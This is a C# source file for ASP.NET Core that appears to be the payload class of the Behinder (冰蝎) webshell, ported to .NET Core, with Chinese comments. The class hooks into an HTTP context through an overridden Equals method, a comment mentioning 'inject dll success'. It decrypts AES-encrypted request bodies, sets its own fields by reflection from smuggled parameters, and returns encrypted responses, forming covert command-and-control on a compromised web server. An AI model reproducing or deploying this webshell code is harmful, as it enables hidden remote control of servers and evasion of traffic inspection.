using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;
    //public HttpApplicationState Application;

    public string content;

    public string sessionId;

    //private Page page;

    private DefaultHttpContext context;

    private object current;

    // 全局保存
    public static Dictionary<string, Object> globals;

    public string error_msg;


    public override bool Equals(Object obj)
    {
        //((HttpContext) obj).Response.Body.WriteAsync(System.Text.Encoding.UTF8.GetBytes("Hello inject dll success!"));
        this.init(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            dictionary.Add("status", "success");
            dictionary.Add("msg", this.content);
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "success");
            dictionary.Add("msg", ex.Message);
        }

        this.Response.Body.WriteAsync(this.EnjsonAndCrypt(dictionary));
        return true;
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    public void global_init()
    {
        if (globals == null)
        {
            globals = new Dictionary<string, object>();
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        this.global_init();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillSessionHandler();
        this.fillParams();

        // if (obj is HttpContext httpContext) // 传入的是HttpContext
        // {
        //     this.current = httpContext.Request.Path; // HttpContext.CurrentHandler 的主要作用是获取当前请求所匹配的处理程序（Handler）
        //     this.fillRequestHandler(httpContext);
        //     this.fillSessionHandler();
        //     this.fillParams();
        // }
        // else
        // {
        //     this.current = obj;
        //     this.fillRequest(obj);
        //     this.fillSession();
        //     this.fillParams();
        // }
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8"; // 字符集
    }

    private void fillSessionHandler()
    {
        try
        {
            // 这一步获取Session的时候 在.net core上如果没有开启session服务的话需要使用会话全局来保持
            this.Session = ((HttpContext)this.context).Session;
            // .net core设计原则更注重无状态性和分布式 所以也没有Application// .net core的 Session 是惰性初始化的 所以要赋值
            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));
            // 将session作为键保存到全局变量中
            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            //this.Application = this.ApplicationContext; // 全局共享数据
            //this.Application = _contextAccessor; // 全局共享数据

            // if (!context.Items.ContainsKey(this.context.Session.Id) ||
            //     this.context.Items[this.context.Session.Id] == null) // 用context来存储吧
            // {
            //     this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            // }
            // 如果发生异常说明没有开启session功能，使用冰蝎创建的session作为键
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            // 将请求体内容同步读取到 memoryStream 中
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);

            // 重置流的位置以便后续读取
            memoryStream.Seek(0, SeekOrigin.Begin);

            // 将内容转换为字节数组
            byte[] array = memoryStream.ToArray();

            // 解密数据（确保 Decrypt 方法适用于字节数组）
            array = Decrypt(array);

            // 获取额外的数据
            Dictionary<string, string> extraData = getExtraData(array);

            // 如果数据不为空，则通过反射赋值
            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);

        // var method = ((DefaultHttpContext)current).Items["views_ViewStart"].GetType().GetMethod("Encrypt");
        // var method2 = ((DefaultHttpContext)current).Items["DecryptFunc"];
        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            // array = (byte[])method.Invoke(((DefaultHttpContext)current).Items["views_ViewStart"], new object[] { data });
            // array = method();
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        // var method = ((DefaultHttpContext)current).Items["views_ViewStart"].GetType().GetMethod("Decrypt");
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create()) // 使用 Aes 来代替 RijndaelManaged
            {
                aesAlg.Key = bytes; // 设置加密的密钥
                aesAlg.IV = bytes; // 设置初始化向量（IV），这里示例使用同一个密钥作为 IV，实际中建议使用不同的 IV

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV); // 创建解密转换器
                result = decryptor.TransformFinalBlock(data, 0, data.Length); // 执行解密
            }
        }
        else
        {
            // result = (byte[])method.Invoke(((DefaultHttpContext)current).Items["views_ViewStart"],
            //     new object[] { data });
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        //this.page = (Page)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8"; // 字符集
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            //this.Application = this.page.Application;
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null) // 用context来存储吧
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}